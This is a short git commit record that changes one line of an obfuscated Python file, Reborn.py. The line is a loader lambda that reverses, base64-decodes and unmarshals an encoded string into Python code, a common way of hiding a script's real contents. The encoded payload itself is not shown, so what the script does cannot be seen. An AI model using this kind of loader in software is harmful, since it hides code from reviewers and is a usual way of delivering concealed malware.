314fba18ffc81350f713986532330290a3bfb003
Rebo-rN <reborncrexx@gmail.com>
2026-03-17 16:24:12 +0545

    Fix formatting of obfuscated lambda function

--- Reborn.py
+++ Reborn.py
@@ -3,4 +3,4 @@
 # https://www.github.com/htr-tech
 # Time : Mon Mar 16 18:34:31 2026
 # -------------------------------
-_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));e>
+_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]))
